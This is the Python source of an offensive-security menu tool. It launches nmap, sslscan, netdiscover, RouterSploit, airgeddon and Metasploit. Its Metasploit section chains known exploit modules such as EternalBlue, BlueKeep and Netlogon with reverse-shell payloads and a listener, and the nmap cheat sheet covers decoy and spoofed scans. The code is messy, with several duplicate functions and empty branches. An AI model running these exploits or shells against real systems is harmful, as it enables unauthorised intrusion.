import signal
import sys
import platform
import subprocess
import threading
import time
import os
import re
import ipaddress
import requests
import sys
import shutil
import subprocess
from colorama import init, Fore, Style
import socket
import re



init(autoreset=True)
def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def show_main_menu_logo():
    kra = r'''
██╗  ██╗██████╗  █████╗
██║ ██╔╝██╔══██╗██╔══██╗
█████╔╝ ██████╔╝███████║
██╔═██╗ ██╔══██╗██╔══██║
██║  ██╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
'''
    ken = r'''
██╗  ██╗███████╗███╗   ██╗
██║ ██╔╝██╔════╝████╗  ██║
█████╔╝ █████╗  ██╔██╗ ██║
██╔═██╗ ██╔══╝  ██║╚██╗██║
██║  ██╗███████╗██║ ╚████║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
'''

    clear_screen()

    light_purple = '\033[38;2;255;165;0m'
    faded_white = Fore.LIGHTYELLOW_EX + Style.BRIGHT

    kra_lines = kra.strip().split("\n")
    ken_lines = ken.strip().split("\n")

    max_length = max(len(line) for line in kra_lines)

    for kra_line, ken_line in zip(kra_lines, ken_lines):
        print(f"{light_purple}{kra_line:<{max_length}}{faded_white}{ken_line}")

def main():
    print("Starting script...") 
    show_main_menu_logo()


if __name__ == "__main__":
    main()
def run_nmap():
    """Function to launch Nmap with a Command."""
    try:
        print(Fore.LIGHTWHITE_EX + "\nChoose an Nmap option:")
        print("1. Run Nmap")
        print("99. Return to Main Menu")  
        choice = input(Fore.LIGHTCYAN_EX + "\nEnter your choice: ").strip()

        
        if choice == '99':
            print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
            return  

       
        if choice == '1':
            print(Fore.LIGHTRED_EX + "\nEnter Command (Example: nmap 192.168.1.1 -vv -n):")
            command = input(Fore.LIGHTMAGENTA_EX + "Enter command: ").strip()

            if command:
                print(Fore.GREEN + f"Running command: {command}")
                try:
                    
                    if not shutil.which("nmap"):
                        print(Fore.RED + "Nmap is not installed or not found in the system path.")
                        return

                    
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)

                    
                    if result.returncode == 0:
                        print(Fore.GREEN + "\nNmap scan completed successfully.")
                        output = result.stdout

                       
                        print(Fore.LIGHTCYAN_EX + "\nNmap Results:")
                        print(output)

                        
                        save_results = input(Fore.YELLOW + "\nWould you like to save the results? (yes/no): ").strip().lower()
                        if save_results == 'yes':
                            file_name = input(Fore.LIGHTWHITE_EX + "Enter file name (without extension): ").strip() + ".txt"
                            with open(file_name, "w") as file:
                                file.write(output)
                            print(Fore.GREEN + f"Results saved to '{file_name}'.")
                        elif save_results == 'no':
                            print(Fore.WHITE + "Results not saved.")
                        else:
                            print(Fore.RED + "Invalid choice. Results not saved.")
                    else:
                        print(Fore.RED + "\nNmap did not complete successfully.")
                        print(Fore.YELLOW + f"Error: {result.stderr}")

                except Exception as e:
                    print(Fore.RED + f"Error running Nmap: {e}")
            else:
                print(Fore.RED + "Invalid command. Please try again.")

    except Exception as e:
        print(Fore.RED + f"Error launching Nmap: {e}")

def clear_screen():
    """Clears the terminal screen."""
    subprocess.call('clear' if os.name == 'posix' else 'cls', shell=True)

def main_menu():
    while True:
        clear_screen() 
        print(Fore.WHITE + "\nNmap:")
        print(Fore.GREEN + "1. Run Nmap")
        print(Fore.RED + "99. Return to main menu")

        option = input(Fore.CYAN + "\nEnter an option: ").strip()

        if option == "1":
            run_nmap()  
        elif option == "99":
            print(Fore.GREEN + "Exiting program...")
            break
        else:
            print(Fore.RED + "Invalid option. Please try again.")

init(autoreset=True)

def show_all_nmap_commands():
    """Displays a list of all Nmap commands."""
    clear_screen()
    commands = [
        "nmap 192.168.1.1 -sS TCP SYN port scan (Default)",
        "nmap 192.168.1.1 -sT TCP connect port scan (Default without root privilege)",
        "nmap 192.168.1.1 -sU UDP port scan",
        "nmap 192.168.1.1 -sA TCP ACK port scan",
        "nmap 192.168.1.1 -sW TCP Window port scan",
        "nmap 192.168.1.1 -sM TCP Maimon port scan",
        "nmap 192.168.1.1-1/24 -PR ARP discovery on local network",
        "nmap 192.168.1.1 -p http,https Port scan from service name",
        "nmap 192.168.1.1 -sV -version-all Enable intensity level 9. Higher possibility of correctness. Slower",
        "nmap 192.168.1.1 -O Remote OS detection using TCP/IP stack fingerprinting",
        "nmap 192.168.1.1 -O -osscan-limit If at least one open and one closed TCP port are not found it will not try OS detection against host",
        "nmap 192.168.1.1 -O -osscan-guess Makes Nmap guess more aggressively",
        "nmap 192.168.1.1 -O -max-os-tries 1 Set the maximum number x of OS detection tries against a target",
        "nmap 192.168.1.1 -A Enables OS detection, version detection, script scanning, and traceroute",
        "nmap 192.168.1.1 -T5 Insane (5) speeds scan; assumes you are on an extraordinarily fast network",
        "nmap 192.168.1.1 -sC Scan with default NSE scripts. Considered useful for discovery and safe",
        "nmap 192.168.1.1 -script default Scan with default NSE scripts. Considered useful for discovery and safe",
        "nmap 192.168.1.1 -script=banner Scan with a single script. Example banner",
        "nmap 192.168.1.1 -script=http* Scan with a wildcard. Example http",
        "nmap 192.168.1.1 -script=http,banner Scan with two scripts. Example http and banner",
        "nmap 192.168.1.1 -script \"not intrusive\" Scan default, but remove intrusive scripts",
        "nmap 192.168.1.1 -script snmp-sysdescr -script-args snmpcommunity=admin NSE script with arguments",
        "nmap -Pn -script=http-sitemap-generator scanme.nmap.org http site map generator",
        "nmap -n -Pn -p 80 -open -sV -vvv -script banner,http-title -iR 1000 Fast search for random web servers",
        "nmap -Pn -script=dns-brute domain.com Brute forces DNS hostnames guessing subdomains",
        "nmap -n -Pn -vv -O -sV -script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1 Safe SMB scripts to run",
        "nmap -script whois* domain.com Whois query",
        "nmap -p80 -script http-unsafe-output-escaping scanme.nmap.org Detect cross site scripting vulnerabilities",
        "nmap -p80 -script http-sql-injection scanme.nmap.org Check for SQL injections",
        "nmap 192.168.1.1 -f Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters",
        "nmap 192.168.1.1 -mtu 32 Set your own offset size",
        "nmap -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1 Send scans from spoofed IPs",
        "nmap -D decoy-ip1,decoy-ip2,your-own-ip,decoy-ip3,decoy-ip4 remote-host-ip Above example explained",
        "nmap -S www.microsoft.com www.facebook.com Scan Facebook from Microsoft (-e eth0 -Pn may be required)",
        "nmap -g 53 192.168.1.1 Use given source port number",
        "nmap -proxies http://192.168.1.1:8080, http://192.168.1.2:8080 192.168.1.1 Relay connections through HTTP/SOCKS4 proxies",
        "nmap -data-length 200 192.168.1.1 Appends random data to sent packets",
        "nmap 192.168.1.1 -oN normal.file Normal output to the file normal.file",
        "nmap 192.168.1.1 -oX xml.file XML output to the file xml.file",
        "nmap 192.168.1.1 -oG grep.file Grepable output to the file grep.file",
        "nmap 192.168.1.1 -oA results Output in the three major formats at once",
        "nmap 192.168.1.1 -oG - Grepable output to screen. -oN -, -oX - also usable",
        "nmap 192.168.1.1 -oN file.file -append-output Append a scan to a previous scan file",
        "nmap 192.168.1.1 -v Increase the verbosity level (use -vv or more for greater effect)",
        "nmap 192.168.1.1 -d Increase debugging level (use -dd or more for greater effect)",
        "nmap 192.168.1.1 -reason Display the reason a port is in a particular state, same output as -vv",
        "nmap 192.168.1.1 -open Only show open (or possibly open) ports",
        "nmap 192.168.1.1 -T4 -packet-trace Show all packets sent and received",
        "nmap -iflist Shows the host interfaces and routes",
        "nmap -resume results.file Resume a scan",
        "nmap -p80 -sV -oG - -open 192.168.1.1/24 | grep open Scan for web servers and grep to show which IPs are running web servers",
        "nmap -iR 10 -n -oX out.xml | grep \"Nmap\" | cut -d \" \" -f5 > live-hosts.txt Generate a list of the IPs of live hosts",
        "nmap -iR 10 -n -oX out2.xml | grep \"Nmap\" | cut -d \" \" -f5 >> live-hosts.txt Append IP to the list of live hosts",
        "ndiff scanl.xml scan2.xml Compare output from nmap using the ndiff",
        "xsltproc nmap.xml -o nmap.html Convert nmap xml files to html files",
        "grep \" open \" results.nmap | sed -r ‘s/ +/ /g’ | sort | uniq -c | sort -rn | less Reverse sorted list of how often ports turn up",
        "nmap -6 2607:f0d0:1002:51::4 Enable IPv6 scanning",
        "nmap -h nmap help screen",
        "nmap -iR 10 -PS22-25,80,113,1050,35000 -v -sn Discovery on specific ports",
        "nmap 192.168.1.1-1/24 -PR -sn -vv ARP discovery only on local network",
        "nmap -iR 10 -sn -traceroute Random target traceroute",
        "nmap 192.168.1.1-50 -sL -dns-server 192.168.1.1 Query the Internal DNS for hosts, list targets only",
        "nmap 192.168.1.1 --packet-trace Show the details of the packets that are sent and received during a scan and capture the traffic"
    ]

    for command in commands:
        print(command)

    print(Fore.LIGHTCYAN_EX + "\nPress any key to return to the menu...")
    input()  
    return 



def show_nse_script_commands():
   clear_screen()
   commands = [
      "NSE Script Commands:",
      "nmap --script=vuln 192.168.1.1 Run vulnerability scripts",
      "nmap --script=http-enum 192.168.1.1 Enumerate web services",
      "nmap --script=default 192.168.1.1 Run default scripts"
   ]
   show_submenu(commands)


def show_firewall_scan_commands():
   clear_screen()
   commands = [
      "Firewall Scan Commands:",
      "nmap -Pn 192.168.1.1 Scan without ping",
      "nmap -f 192.168.1.1 Fragment packets",
      "nmap --mtu 24 192.168.1.1 Specify custom MTU"
   ]
   show_submenu(commands)


def show_submenu(commands):
   print("\n".join(commands))
   input(Fore.WHITE + "\nPress Enter to return to the main menu...")



def exiting_loading_screen():
   clear_screen()
   loading_text = '''

  _             _
 | |__ _  _ ___| |__ _  _ ___
 | '_ \ || / -_) '_ \ || / -_)
 |_.__/\_, \___|_.__/\_, \___|
       |__/          |__/


   '''
   colors = ['\033[38;5;218m', Fore.LIGHTWHITE_EX,]
   for i, line in enumerate(loading_text.splitlines()):
      print(colors[i % len(colors)] + line)  
      time.sleep(0.1) 
   
   print(Fore.LIGHTWHITE_EX + "\n")
   time.sleep(0.1)  
   print(Fore.LIGHTWHITE_EX + "Credits! biskit")
   sys.exit()  

def sslscan_scan():
    global scanning_in_progress
    try:
        print(Fore.BLUE + "\nChoose an SSLScan command:")

        print("4. Manual SSLScan")
        print("6. Show SSLScan Command List")  
        print("99. Return to Main Menu")  
        choice = input(Fore.BLUE + "\nEnter your choice: ").strip()

        
        if choice == '99':
            print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
            return  

        
        if choice == '6':
            show_sslscan_commands()
            return

        ip = ""  

       
        if choice in ['1', '2', '3', '5']:  
            ip = get_ip_address()  
            if not ip:
                print(Fore.RED + "No IP address provided. Exiting SSLScan.")
                return

        if choice == '':
            command = f""
        elif choice == '':
            command = f""
        elif choice == '':
            command = f""
        elif choice == '4':
            print(Fore.YELLOW + "\nExample of Manual SSLScan command:")
            print(Fore.YELLOW + "sslscan --bugs 192.168.1.1")
            command = input(Fore.BLUE + "Enter your SSLScan command: ").strip()
            if not command:
                print(Fore.RED + "No command entered. Returning to menu.")
                return  
            print(Fore.GREEN + f"Running custom SSLScan command: {command}")  
        elif choice == '':
            command = f""  
        else:
            print(Fore.RED + "Invalid choice. Exiting SSLScan.")
            return

        print(Fore.YELLOW + f"Debug: Command to run: {command}")

        
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        
        if stderr:
            print(Fore.RED + "Error during SSLScan:", stderr.decode())
        else:
            output = stdout.decode()
            if output:  
                print(Fore.BLUE + "SSLScan Completed Successfully.")
                print(output)
            else:
                print(Fore.RED + "No output received from SSLScan.")

           
            save_choice = input(Fore.YELLOW + "\nWould you like to save the results? (yes/no): ").strip().lower()
            if save_choice == 'yes':
                file_name = input(Fore.LIGHTWHITE_EX + "Enter file name (without extension): ").strip() + ".txt"
                if file_name:  
                    with open(file_name, "a") as file:
                        file.write(f"IP: {ip}\n{output}\n\n")
                    print(Fore.BLUE + f"Results saved to '{file_name}'.")
                else:
                    print(Fore.RED + "Invalid file name. Results not saved.")
            elif save_choice == 'no':
                print(Fore.GREEN + "Returning to the main menu...")
            else:
                print(Fore.RED + "Invalid choice. Returning to the main menu.")
                return  

    except Exception as e:
        print(Fore.RED + f"Error running SSLScan: {e}")
    finally:
        scanning_in_progress = False
        clear_screen()  


def get_ip_address():
    
    ip = input(Fore.BLUE + "Enter the IP address to scan: ").strip()
    return ip


def clear_screen():
    subprocess.call('clear' if os.name == 'posix' else 'cls', shell=True)


def show_sslscan_commands():
    clear_screen()
    ssl_commands = [
        "SSLScan Command List:",
        "--targets=<file>     A file containing a list of hosts to check.",
        "--sni-name=<name>    Hostname for SNI",
        "--ipv4, -4           Only use IPv4",
        "--ipv6, -6           Only use IPv6",
        "--show-certificate   Show full certificate information",
        "--show-client-cas    Show trusted CAs for TLS client auth",
        "--no-check-certificate  Don't warn about weak certificate algorithm or keys",
        "--ocsp               Request OCSP response from server",
        "--pk=<file>          A file containing the private key or a PKCS#12 file containing a private key/certificate pair",
        "--pkpass=<password>  The password for the private key or PKCS#12 file",
        "--certs=<file>       A file containing PEM/ASN1 formatted client certificates",
        "--ssl2               Only check if SSLv2 is enabled",
        "--ssl3               Only check if SSLv3 is enabled",
        "--tls10              Only check TLSv1.0 ciphers",
        "--tls11              Only check TLSv1.1 ciphers",
        "--tls12              Only check TLSv1.2 ciphers",
        "--tls13              Only check TLSv1.3 ciphers",
        "--tlsall             Only check TLS ciphers (all versions)",
        "--show-ciphers       Show supported client ciphers",
        "--show-cipher-ids    Show cipher ids",
        "--show-times         Show handshake times in milliseconds",
        "--no-cipher-details  Disable EC curve names and EDH/RSA key lengths output",
        "--no-ciphersuites    Do not check for supported ciphersuites",
        "--no-compression     Do not check for TLS compression (CRIME)",
        "--no-fallback        Do not check for TLS Fallback SCSV",
        "--no-groups          Do not enumerate key exchange groups",
        "--no-heartbleed      Do not check for OpenSSL Heartbleed (CVE-2014-0160)",
        "--no-renegotiation   Do not check for TLS renegotiation",
        "--show-sigs          Enumerate signature algorithms",
        "--starttls-ftp       STARTTLS setup for FTP",
        "--starttls-imap      STARTTLS setup for IMAP",
        "--starttls-irc       STARTTLS setup for IRC",
        "--starttls-ldap      STARTTLS setup for LDAP",
        "--starttls-mysql     STARTTLS setup for MYSQL",
        "--starttls-pop3      STARTTLS setup for POP3",
        "--starttls-psql      STARTTLS setup for PostgreSQL",
        "--starttls-smtp      STARTTLS setup for SMTP",
        "--starttls-xmpp      STARTTLS setup for XMPP",
        "--xmpp-server        Use a server-to-server XMPP handshake",
        "--rdp                Send RDP preamble before starting scan",
        "--bugs               Enable SSL implementation bug work-arounds",
        "--no-colour          Disable coloured output",
        "--sleep=<msec>       Pause between connection requests. Default is disabled",
        "--timeout=<sec>      Set socket timeout. Default is 3s",
        "--verbose            Display verbose output",
        "--version            Display the program version",
        "--xml=<file>         Output results to an XML file. Use - for STDOUT.",
        "--help               Display the help text you are now reading",
        "Example: sslscan 127.0.0.1",
        "Example: sslscan [::1]"
    ]

    print(Fore.GREEN + "\nAvailable SSLScan Commands:")
    for command in ssl_commands:
        print(Fore.YELLOW + command)
    print(Fore.LIGHTCYAN_EX + "\nPress any key to return to the menu...")
    input()  
    return  




def update_script():
   try:
      print("Updated Restart Script")
      url = "https://raw.githubusercontent.com/biskit069/kraken/refs/heads/main/kraken.py"
      response = requests.get(url)
      if response.status_code == 200:
        confirm = input("Update (yes/no): ")
        if confirm.lower() == "yes":
           with open(__file__, "w") as file:
              file.write(response.text)
           print("Script updated successfully!")
        else:
           print("Update cancelled.")
      else:
        print(f"Error updating script: {response.status_code}")
   except requests.exceptions.RequestException as e:
      print(f"Error updating script: {e}")
   finally:
      clear_screen()
def run_routersploit():
    """Function to run RouterSploit with sudo automatically and display host info."""
    try:
        
        hostname = subprocess.check_output("whoami", shell=True).decode().strip()

        
        path = shutil.which("rsf.py")
        if not path:
            print(Fore.RED + "RouterSploit is not installed or not found in the system path.")
            return

        
        os.chdir(os.path.dirname(path))

       
        print(Fore.GREEN + f"\nRunning RouterSploit as {hostname}...")
        subprocess.run(["sudo", "python3", "rsf.py"])

        print(Fore.GREEN + "RouterSploit has been stopped. Returning to the main menu...")

    except Exception as e:
        print(Fore.RED + f"Error running RouterSploit: {e}")
        
def metasploit_scan():
    try:
        while True:
            print("1. Launch Metasploit")
            print("2. Auto exploits")
            print("3. Reverse Shell Option")  # Added option for reverse shell
            print(Fore.YELLOW + "99. to return to main menu")
            choice = input(Fore.BLUE + "\nEnter your choice: ").strip()

            print(Fore.YELLOW + f"Choice: '{choice}'")

            metasploit_commands = ""
            ip = ""

            if choice == '1':  
                print(Fore.LIGHTCYAN_EX + "Launching manual Metasploit...")
                os.system("msfconsole")
                continue
            elif choice == '2':  
                print(Fore.LIGHTCYAN_EX + "Launching Auto exploits...")

                # List of 20 network exploits
                exploits = {
                    "1": "exploit/windows/smb/ms17_010_eternalblue",
                    "2": "exploit/windows/smb/ms08_067_netapi",
                    "3": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
                    "4": "exploit/unix/ssh/sshexec",
                    "5": "exploit/unix/webapp/apache_mod_cgi_bash_env_exec",
                    "6": "exploit/unix/webapp/php_cgi_arg_injection",
                    "7": "exploit/unix/webapp/php_include",
                    "8": "exploit/unix/ftp/proftpd_133c_backdoor",
                    "9": "exploit/unix/ftp/anonymous",
                    "10": "exploit/unix/ldap/ldap_exploit",
                    "11": "exploit/linux/mysql/mysql_auth_bypass",
                    "12": "exploit/windows/mssql/mssql_payload",
                    "13": "exploit/windows/mssql/mssql_ping",
                    "15": "exploit/windows/smb/ms20_0796_smbv3_lpe",
                    "16": "exploit/windows/mssql/mssql_ping",
                    "17": "exploit/unix/samba/samba_symlink_traversal",
                    "18": "exploit/multi/misc/java_deserialization",
                    "19": "exploit/multi/http/weblogic_deserialize",
                    "20": "exploit/windows/fileformat/winrar_unace",
                    "21": "exploit/linux/local/sudo_cve_2019_14287",
                    "22": "exploit/windows/smb/ms12_020_kernel",
                    "23": "exploit/unix/ftp/proftpd_133c_backdoor",
                    "24": "exploit/unix/webapp/apache_mod_cgi_bash_env_exec",
                    "25": "exploit/linux/local/cve_2016_5195_dirty_cow",
                    "26": "exploit/linux/samba/is_known_pipename",
                    "27": "exploit/multi/http/struts2_rest_xstream",
                    "28": "exploit/multi/http/struts2_content_type_ognl",
                    "29": "auxiliary/scanner/ssl/openssl_heartbleed",
                    "30": "exploit/windows/smb/cve_2020_1472_netlogon",
                    "31": "exploit/windows/smb/ms10_061_spoolss",
                }

                # Display all exploits
                print(Fore.YELLOW + "Select the exploit you want to use:")
                for key, value in exploits.items():
                    print(f"{key}: {value}")

                exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to use: ").strip()

                if exploit_choice in exploits:
                    # Set the exploit
                    exploit = exploits[exploit_choice]
                    metasploit_commands += f"use {exploit}; "
                    print(Fore.YELLOW + f"Selected exploit: {exploit}")

                    # Select payload
                    payloads = {
                        "1": "windows/x64/meterpreter/reverse_tcp",
                        "2": "linux/x86/meterpreter/reverse_tcp",
                        "3": "cmd/unix/reverse_bash",
                        "4": "windows/meterpreter/bind_tcp",
                        "5": "php/meterpreter/reverse_tcp"
                    }

                    print(Fore.YELLOW + "Select payload:")
                    for key, value in payloads.items():
                        print(f"{key}: {value}")

                    payload_choice = input(Fore.BLUE + "\nEnter the number of the payload you want to use: ").strip()

                    if payload_choice in payloads:
                        payload = payloads[payload_choice]
                        metasploit_commands += f"set PAYLOAD {payload}; "
                        print(Fore.YELLOW + f"Selected payload: {payload}")

                        # Set LHOST or RHOST
                        host_choice = input(Fore.BLUE + "\nSelect host (LHOST or RHOST): ").strip()

                        if host_choice.lower() == "lhost":
                            lhost = input(Fore.BLUE + "Enter LHOST: ").strip()
                            metasploit_commands += f"set LHOST {lhost}; "
                            print(Fore.YELLOW + f"Set LHOST: {lhost}")
                        elif host_choice.lower() == "rhost":
                            rhost = input(Fore.BLUE + "Enter RHOST: ").strip()
                            metasploit_commands += f"set RHOST {rhost}; "
                            print(Fore.YELLOW + f"Set RHOST: {rhost}")
                        else:
                            print(Fore.RED + "Invalid choice for host. Exiting...")
                            continue

                        # Set LPORT or RPORT
                        port_choice = input(Fore.BLUE + "\nSelect port (LPORT or RPORT): ").strip()

                        if port_choice.lower() == "lport":
                            lport = input(Fore.BLUE + "Enter LPORT: ").strip()
                            metasploit_commands += f"set LPORT {lport}; "
                            print(Fore.YELLOW + f"Set LPORT: {lport}")
                        elif port_choice.lower() == "rport":
                            rport = input(Fore.BLUE + "Enter RPORT: ").strip()
                            metasploit_commands += f"set RPORT {rport}; "
                            print(Fore.YELLOW + f"Set RPORT: {rport}")
                        else:
                            print(Fore.RED + "Invalid choice for port. Exiting...")
                            continue

                        # Finalizing the full command to run in msfconsole
                        metasploit_commands += "run"

                        # Execute the full Metasploit command with proper quotes
                        command_to_run = f"msfconsole -q -x \"{metasploit_commands}\""
                        print(Fore.YELLOW + f"Full command to execute: \n{command_to_run}")

                        # Run the command
                        os.system(command_to_run)
                    else:
                        print(Fore.RED + "Invalid payload choice. Exiting...")
                        continue
                else:
                    print(Fore.RED + "Invalid exploit choice. Exiting...")
                    continue

            elif choice == '3':  # Reverse Shell Option
                print(Fore.LIGHTCYAN_EX + "Launching Reverse Shell Option...")

                print(Fore.WHITE+ "how to use (you will need to send a file over to the attackers machine to gain access first you will need to set up the listenr or exploiting a vulnerability to gain access:")
                lhost = input(Fore.BLUE + "Enter LHOST (your local IP this is your private ip):").strip()
                lport = input(Fore.BLUE + "Enter LPORT (the port for the reverse shell): ").strip()

                # Command for reverse shell
                reverse_shell_command = f"msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run\""
                print(Fore.YELLOW + f"Executing: {reverse_shell_command}")
                os.system(reverse_shell_command)

            elif choice == '99':  
                print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
                break
            else:
                print(Fore.RED + "Invalid choice. Please try again.")
                continue

    except Exception as e:
        print(Fore.RED + f"Error running Metasploit: {e}")


def run_tracepath():
    """Function to run tracepath interactively."""
    try:
        clear_screen()
        print(Fore.GREEN + "Tracepath Utility\n")

        
        target = input(Fore.CYAN + "Enter the target domain or IP for tracepath: ").strip()
        if not target:
            print(Fore.RED + "No target specified. Returning to the main menu.")
            return

        print(Fore.GREEN + f"\nRunning tracepath on {target}...\n")

       
        result = subprocess.run(["tracepath", target], text=True, capture_output=True)

        
        if result.returncode == 0:
            print(Fore.LIGHTWHITE_EX + result.stdout)
        else:
            print(Fore.RED + f"Error running tracepath: {result.stderr}")

        
        input(Fore.GREEN + "\nPress Enter to return to the main menu...")

    except Exception as e:
        print(Fore.RED + f"Error running tracepath: {e}")

def clear_screen():
    """Clear the screen based on the OS."""
    os.system('cls' if os.name == 'nt' else 'clear')

def run_tracepath():
    """Function to run tracepath interactively."""
    try:
        clear_screen()
        print(Fore.GREEN + "Tracepath Utility\n")

        
        target = input(Fore.CYAN + "Enter the target domain or IP for tracepath: ").strip()
        if not target:
            print(Fore.RED + "No target specified. Returning to the main menu.")
            return

        print(Fore.GREEN + f"\nRunning tracepath on {target}...\n")

       
        process = subprocess.Popen(
            ["tracepath", target],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        
        for line in process.stdout:
            print(Fore.LIGHTWHITE_EX + line.strip())

        
        process.wait()
        if process.returncode != 0:
            error_message = process.stderr.read()
            print(Fore.RED + f"Error running tracepath: {error_message.strip()}")

        
        input(Fore.GREEN + "\nPress Enter to return to the main menu...")

    except Exception as e:
        print(Fore.RED + f"Error running tracepath: {e}")

def show_tracepath_commands():
    """Function to display all tracepath-related commands."""
    clear_screen()
    print(Fore.GREEN + "Available Tracepath Commands\n")
    print(Fore.LIGHTWHITE_EX + """
    tracepath <target>
        - Traces the path packets take to reach the target domain or IP.

    Examples:
        tracepath google.com
        tracepath 8.8.8.8
    """)
    input(Fore.GREEN + "\nPress Enter to return to the main menu...")

def main_menu():
    """Main menu for the script."""
    while True:
        clear_screen()
        print(Fore.WHITE + "Main Menu")
        print(Fore.GREEN + "1. Run Tracepath")
        print(Fore.BLUE + "2. Show Tracepath Commands")
        print(Fore.RED + "9. Exit")

        choice = input(Fore.CYAN + "\nEnter your choice: ").strip()

        if choice == "1":
            run_tracepath()
        elif choice == "2":
            show_tracepath_commands()
        elif choice == "9":
            print(Fore.GREEN + "Exiting program...")
            break
        else:
            print(Fore.RED + "Invalid choice. Please try again.")

def clear_screen():
    """Clears the terminal screen."""
    os.system('clear' if os.name == 'posix' else 'cls')

def show_netdiscover_commands():
    clear_screen()  
    print("Netdiscover Usage:")
    print("""
Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-F filter] [-s time] [-c count] [-n node] [-dfPLNS]

  -i device: your network device
  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
  -l file: scan the list of ranges contained into the given file
  -p passive mode: do not send anything, only sniff
  -m file: scan a list of known MACs and host names
  -F filter: customize pcap filter expression (default: "arp")
  -s time: time to sleep between each ARP request (milliseconds)
  -c count: number of times to send each ARP request (for nets with packet loss)
  -n node: last source IP octet used for scanning (from 2 to 253)
  -d ignore home config files for autoscan and fast mode
  -f enable fastmode scan, saves a lot of time, recommended for auto
  -P print results in a format suitable for parsing by another program and stop after active scan
  -L similar to -P but continue listening after the active scan is completed
  -N Do not print header. Only valid when -P or -L is enabled.
  -S enable sleep time suppression between each request (hardcore mode)

If -r, -l or -p are not enabled, netdiscover will scan for common LAN addresses.
    """)
    input("\nPress Enter to return to the menu...")  

def run_auto_netdiscover(ip):
    try:
        print(f"Running: sudo netdiscover -r {ip}")
        subprocess.run(['sudo', 'netdiscover', '-r', ip], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running Netdiscover: {e}")

def run_manual_netdiscover():
    manual_command = input("Enter your manual Netdiscover command: ")
    try:
        print(f"Running: {manual_command}")
        subprocess.run(manual_command.split(), check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running the manual Netdiscover command: {e}")

def netdiscover_menu():
    while True:
        clear_screen()  # Clear the screen every time the menu is shown
        print("\nNetdiscover Menu:")
        print("1. Show Netdiscover Commands")
        print("2. Run Auto Netdiscover (16 IPs scan)")
        print("3. Run Manual Netdiscover Command")
        print("4. Return to Main Menu")
        choice = input("Choose an option: ")

        if choice == '1':
            show_netdiscover_commands()
        elif choice == '2':
            ip = input("Enter an IP or IP range (e.g., 192.168.1.0/28 for 16 IPs): ")
            run_auto_netdiscover(ip)
        elif choice == '3':
            run_manual_netdiscover()
        elif choice == '4':
            break
        else:
            print("Invalid choice, please try again.")


init(autoreset=True)

def find_g2l_script():
    """Search for the g2l.py script in the system."""
    for root, dirs, files in os.walk('/'):  
        if 'g2l.py' in files:
            script_path = os.path.join(root, 'g2l.py')
            return script_path
    return None  

def execute_python_script():
    """Find the g2l.py script automatically and execute it."""
    script_path = find_g2l_script()

    if script_path:
        try:
            print(Fore.GREEN + f"Executing the script at {script_path}...")
            subprocess.run(["python3", script_path], check=True)
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"Error executing script: {e}")
    else:
        print(Fore.RED + "g2l.py script not found on the system.")
def run_airgeddon():
    try:
        print("Running Airgeddon with sudo...")
        os.system('sudo airgeddon')
    except KeyboardInterrupt:
        print("\nAirgeddon was interrupted.")
        return  

def main_menu():
    while True:
        print("\nMain Menu:")
        print("1. Run Airgeddon")
        print("2. Exit")

        choice = input("Choose an option: ")

        if choice == "1":
            run_airgeddon()
        elif choice == "2":
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")


def clear_screen():
    print("\033[H\033[J", end="")  # Clear the screen


def get_user_home_directory():
    try:
        # Get the current username using 'whoami'
        username = subprocess.check_output(["whoami"]).strip().decode()
        # Construct the home directory path
        home_directory = f"/home/{username}/./asnmap"
        return home_directory
    except subprocess.CalledProcessError as e:
        print(f"Error getting the username: {e}")
        return None

def asnmap_commands():
    clear_screen()
    print("""
    ASNMap Commands:
    Usage:
        [flags]

    Flags:
    INPUT:
       -a, -asn string[]     target asn to lookup, example: -a AS5650
       -i, -ip string[]      target ip to lookup, example: -i 100.19.12.21, -i 2a10:ad40::
       -d, -domain string[]  target domain to lookup, example: -d google.com, -d facebook.com
       -org string[]         target organization to lookup, example: -org GOOGLE
       -f, -file string[]    targets to lookup from file

    CONFIGURATIONS:
       -auth                    configure ProjectDiscovery Cloud Platform (PDCP) api key (default true)
       -config string           path to the asnmap configuration file
       -r, -resolvers string[]  list of resolvers to use
       -p, -proxy string[]      list of proxy to use (comma separated or file input)

    UPDATE:
       -up, -update                 update asnmap to latest version
       -duc, -disable-update-check  disable automatic asnmap update check

    OUTPUT:
       -o, -output string  file to write output to
       -j, -json           display json format output
       -c, -csv            display csv format output
       -v6                 display ipv6 cidr ranges in cli output
       -v, -verbose        display verbose output
       -silent             display silent output
       -version            show version of the project
    """)
    input("\nPress Enter to return to the menu: ")

def run_asnmap_manual():
    try:
        while True:
            command = input("Press Enter To Return Back To Menu| no need to use ./asnmap use a flag (how to use -i 192.168.1.1) ").strip()
            if not command:
                break
            home_directory = get_user_home_directory()
            if home_directory:
                asnmap_path = os.path.join(home_directory)
                print(f"Running command: {asnmap_path} {command}")  # Debugging: Log the command being run
                subprocess.run([asnmap_path] + command.split(), check=True)
            else:
                print("Could not determine the user's home directory.")
    except KeyboardInterrupt:
        print("\nReturning to the menu.")
    except subprocess.CalledProcessError as e:
        print(f"Error running the command: {e}")

def run_asn_scan():
    asn = input("Type Your ASN (example: AS5650): ")
